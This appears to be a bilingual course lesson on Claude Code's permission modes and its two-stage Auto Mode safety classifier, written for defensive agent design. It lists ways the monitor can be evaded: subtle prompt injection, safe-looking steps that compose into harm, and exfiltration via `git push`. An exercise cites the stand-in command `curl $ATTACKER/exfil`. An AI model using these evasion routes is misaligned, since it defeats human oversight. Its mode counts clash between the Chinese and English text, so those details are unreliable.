# Claude Code as an Autonomous Agent: Permission Modes and Auto Mode | Claude 美国

> Claude Code exposes seven permission modes. "plan" asks before every action, "default" asks only for risky ones, "acceptEdits" auto-approves file writes but still confirms shell execution, and "bypassPermissions" approves everything. Auto Mode (March 24, 2026) replaces per-action approval with a two-stage parallel safety classifier: a single-token fast check runs on every action; flagged actions kick off a chain-of-thought deep review. Action budgets are enforced via `max_turns` and `max_budget_usd`. Auto Mode shipped as a research preview — Anthropic has stated explicitly that the classifier is not sufficient alone.

**Type:** Learn | **类型:** 学习
**Languages:** Python (stdlib, two-stage classifier simulator) | **语言:** Python (stdlib, two-stage classifier simulator)
**Prerequisites:** Phase 15 · 01 (Long-horizon agents), Phase 15 · 09 (Coding-agent landscape) | **前置知识:** Phase 15 · 01 (Long-horizon agents), Phase 15 · 09 (Coding-agent landscape)
**Time:** ~45 minutes | **时间:** ~45 minutes

## The Problem | 问题引入

> **【中文解读】** Claude Code 的权限模式是 Agent 安全控制的典型案例。四种模式：(1) Ask——每次操作需用户确认；(2) Edit——文件编辑自动批准，命令需确认；(3) YOLO——所有操作自动批准（危险）；(4) Plan——先规划后执行。这些模式反映了 Agent 自主性与安全性的基本权衡。

> **【拓展：claude code permission modes】** Claude Code 的权限设计体现了 2026 年编码 Agent 的安全最佳实践。关键原则：(1) 最小权限——默认只授予必要权限；(2) 渐进授权——用户可以根据信任度逐步放宽限制；(3) 审计追踪——所有操作都有日志；(4) 紧急停止——随时可以中断。这些原则同样适用于其他 Agent 系统的设计。

An autonomous coding agent on your machine is a distinct security category.

> 你机器上的自主编码 Agent 是一个独特的安全类别。攻击面是 Agent 能触及的一切。 The attack surface is everything the agent can reach — file system, network, credentials, clipboard, any browser tab, any open terminal. Bruce Schneier and others have flagged this publicly: computer-use agents are not a "feature update" of chatbots, they are a new kind of tool with a new kind of risk profile.

Claude Code's permission system is Anthropic's answer. Rather than one "autonomous / not autonomous" switch, there are seven modes spanning a capability ladder.

> Claude Code 的权限系统是 Anthropic 的答案。不是一个开关，而是七种模式。 Rather than one "autonomous / not autonomous" switch, there are seven modes spanning a capability ladder: plan → default → acceptEdits → … → bypassPermissions. Each mode is a different trade-off between speed and review-per-action. Auto Mode (March 2026) adds a two-stage classifier that moves approval off the user's critical path for actions the classifier judges safe, while preserving a review layer for actions the classifier flags.


> **【中文解读】** 本节介绍了 AI Agent 的核心概念和实现方法。Agent 是 LLM 驱动的自主系统，能够观察环境、思考决策、执行行动并循环迭代直到完成目标。

The engineering question: what does this system catch, what does it miss, and which mode does a given task actually warrant?

## The Concept | 核心概念

### The seven permission modes

| Mode | Behavior | When to use |
|---|---|---|
| `plan` | Agent proposes a plan; user approves the whole plan; every action is reviewed before execution | Unfamiliar task; prod-adjacent code; first time using the agent on a repo |
| `default` | Agent runs actions; prompts user for any "risky" action (shell exec, destructive operations, network calls) | Most interactive coding sessions |
| `acceptEdits` | File writes auto-approve; shell exec and network calls still prompt | Refactoring pass across many files |
| `acceptExec` | Shell commands auto-approve within a curated allowlist; writes auto-approve | Tight inner loops where every shell command is `npm test` or similar |
| `autoMode` | Two-stage safety classifier; flagged actions elevate to review | Long-horizon unattended runs in a constrained workspace |
| `yolo` | Skips most prompts; still runs tool allowlist / denylist | Ephemeral sandboxes, CI jobs, research scripts |
| `bypassPermissions` | Approves everything | Documented as "only inside ephemeral containers you are willing to throw away" |

(Names above match public Claude Code docs; "yolo" is the informal shorthand for the permissive middle ground.)

### Auto Mode in one page

Auto Mode (launched March 24, 2026) is the first permission mode to delegate per-action approval to a model.

> Auto Mode 是第一个将每次操作审批委托给模型的权限模式。 Structure:

1. **Stage 1 — single-token classifier.** Runs on every proposed action. Cheap. Returns "safe" or "flag." Designed to run in parallel with the main agent loop so approved actions do not sit in a queue.
2. **Stage 2 — secondary policy/safety review.** Runs only on flagged actions. Performs a focused policy and safety assessment over the action, the current state of the session, and the declared task. Escalates to user HITL if confidence is low.

Budget controls sit alongside the classifier:

- `max_turns` — total iterations in a session.
- `max_budget_usd` — dollar cap that aborts the session.
- action-count limits per tool (no more than N `WebFetch` calls, etc.).

### What the system catches

- Straightforward prompt injection into tool inputs where the injected instruction maps to a known-risky action shape.
- Repetitive tool loops — the classifier can see action N+1 is nearly identical to action N, five times in a row.
- Clearly out-of-scope shell commands on an otherwise file-edit-only session.

### What the system can miss

- **Subtle prompt injection** that modulates behavior without producing a single flagged action. Indirect prompt injection is not a fully patchable vulnerability (OpenAI preparedness head, 2025, on browser agents — see Lesson 11).
- **Semantic-level misbehavior.** Every individual action can look safe while the composed trajectory is harmful. The classifier judges the action; it does not re-derive the user's intent.
- **Exfiltration through legitimate channels.** Writing data to a file you own, then `git push`ing to a public repo, is a sequence of allowed actions whose composition is the problem.

### Research preview framing

Anthropic shipped Auto Mode as a research preview. The documentation is explicit that the classifier is a layer, not a solution: users are expected to combine Auto Mode with budgets, allowlists, isolated workspaces, and trajectory audits (Lessons 12–16). The preview framing also reflects the documented evaluation-vs-deployment gap (Lesson 1) — a classifier that passes offline evals can behave differently in a real session where the user's context is ambiguous.

### Where this ladder lives in your workflow

- Unfamiliar task: start in `plan`. Reading the plan is cheaper than rolling back a bad run.
- Known refactor: `acceptEdits` saves a lot of confirmation clicks.
- Unattended background run: `autoMode` only inside a workspace whose blast radius you have measured (no credentials, no production mounts, no egress you did not opt into).
- Ephemeral containers: `yolo` / `bypassPermissions` is acceptable if and only if the container and its credentials are disposable.

## Use It | 用框架实现

`code/main.py` simulates the two-stage classifier. Stage 1 is a cheap keyword rule over proposed actions; Stage 2 is a slower multi-rule reviewer. The driver feeds in a short synthetic trajectory (safe actions, a prompt-injection attempt, a repetitive loop) and shows where the classifier catches and where it misses.

## Ship It | 产出物

`outputs/skill-permission-mode-picker.md` matches a task description to the right permission mode, budget caps, and required isolation.

## Exercises | 练习题

1. Run `code/main.py`. Which synthetic action type is never flagged by Stage 1 but always caught by Stage 2? Which is caught by neither?

2. Extend the Stage 1 rule set to catch a specific known-bad shape (e.g., `curl $ATTACKER/exfil`). Measure the false-positive rate on the benign-action sample.

3. Read Anthropic's "How the agent loop works" doc. List every external state the agent touches by default in `default` mode. Which would you need to gate separately before running `autoMode` unattended?

4. Design a 24-hour unattended run budget: `max_turns`, `max_budget_usd`, per-tool caps, allowlists. Justify each number.

5. Describe one trajectory where every individual action is approved by Stage 1 and Stage 2, yet the composed behavior is misaligned. (Lesson 14 covers how kill switches and canary tokens address this.)

## Key Terms | 术语速查表

| Term | What people say | What it actually means |
|---|---|---|
| 术语 | 通俗说法 | 实际含义 |
| Permission mode | "How much the agent can do" | One of seven named policies controlling per-action approval |  |
| plan mode | "Ask before anything" | Agent writes a plan; user approves before execution |  |
| acceptEdits | "Let it write files" | File writes auto-approve; shell exec still prompts |  |
| autoMode | "Auto approvals" | Two-stage safety classifier; flagged actions escalate |  |
| bypassPermissions | "Full YOLO" | Approves everything; intended for ephemeral containers |  |
| Stage 1 classifier | "Fast token check" | Single-token rule over proposed action; runs in parallel |  |
| Stage 2 classifier | "Deep review" | Chain-of-thought reasoning over flagged actions |  |
| Research preview | "Not GA" | Anthropic framing for features whose failure mode is still being mapped |  |

## Further Reading | 延伸阅读

- [Anthropic — How the agent loop works](https://code.claude.com/docs/en/agent-sdk/agent-loop) — permission modes, budgets, action format.
- [Anthropic — Claude Managed Agents overview](https://platform.claude.com/docs/en/managed-agents/overview) — managed-service execution model.
- [Anthropic — Claude Code product page](https://www.anthropic.com/product/claude-code) — feature surface and Auto Mode announcement.
- [Anthropic — Claude's Constitution (January 2026)](https://www.anthropic.com/news/claudes-constitution) — the reason-based layer that shapes classifier judgments.
- [Anthropic — Measuring agent autonomy in practice](https://www.anthropic.com/research/measuring-agent-autonomy) — internal perspective on long-horizon permission design.
